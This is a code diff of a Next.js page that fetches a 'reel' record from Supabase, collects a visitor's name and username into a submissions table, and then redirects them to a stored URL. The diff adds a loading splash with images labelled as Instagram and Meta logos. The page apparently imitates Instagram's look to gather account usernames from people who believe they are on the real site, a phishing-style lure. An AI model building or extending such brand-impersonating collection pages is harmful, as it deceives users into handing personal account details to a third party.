@@ -1,6 +1,4 @@
-
 'use client';
-
 import { useState, useEffect } from 'react';
 import { useParams } from 'next/navigation';
 import Image from 'next/image';
@@ -19,7 +17,6 @@ export default function ReelFormPage() {
       if (!reelId) return;
 
       setLoading(true);
-      // Query the reels table using the reelId from the URL
       const { data, error } = await supabase
         .from('reels')
         .select('redirectUrl, reelId')
@@ -45,12 +42,11 @@ export default function ReelFormPage() {
       return;
     }
 
-    // Insert into submissions table, using the reelId from the fetched reelData
     const { error } = await supabase
       .from('submissions')
       .insert([
         {
-          "reelId": reelData.reelId, // Use the UUID reelId from fetched data
+          "reelId": reelData.reelId,
           name,
           username,
         },
@@ -61,23 +57,41 @@ export default function ReelFormPage() {
     } else {
       setName('');
       setUsername('');
-      // Redirect to the saved URL
       window.location.href = reelData.redirectUrl;
     }
   };
 
-  if (loading) {
-    return (
-      <div className="flex items-center justify-center min-h-screen bg-gray-100">
-        <p>Loading...</p>
+ if (loading) {
+  return (
+    <div className="flex flex-col justify-between items-center min-h-screen bg-black py-10">
+      <div></div> {}
+      <div className="flex justify-center">
+        <Image
+          src="/loading_logo.png"
+          alt="Instagram Logo"
+          width={70}
+          height={70}
+          className="animate-fadeIn"
+        />
       </div>
-    );
-  }
+      <div className="flex flex-col items-center">
+        <Image
+          src="/loading_meta_logo.png"
+          alt="Meta Logo"
+          width={60}
+          height={20}
+          className="mt-1"
+        />
+      </div>
+    </div>
+  );
+}
+
 
   if (!reelData) {
     return (
       <div className="flex items-center justify-center min-h-screen bg-gray-100">
-        <div className="w-full max-w-md p-8 space-y-6 bg-white rounded-lg shadow-md text-center">
+        <div className="w-full max-w-md p-8 space-y-6 bg-white rounded-lg text-center">
           <h1 className="text-2xl font-bold">Link Not Found</h1>
           <p className="text-gray-600">The Reel ID &quot;{reelId}&quot; does not exist or is invalid.</p>
         </div>
@@ -100,7 +114,6 @@ export default function ReelFormPage() {
           />
         </div>
 
-        {/* Right */}
         <div className="w-full md:w-1/2 max-w-sm mx-auto">
           <div className="bg-white border border-gray-300 px-8 py-10">
             <Image
@@ -163,5 +176,3 @@ export default function ReelFormPage() {
     </div>
   );
 }
-
-
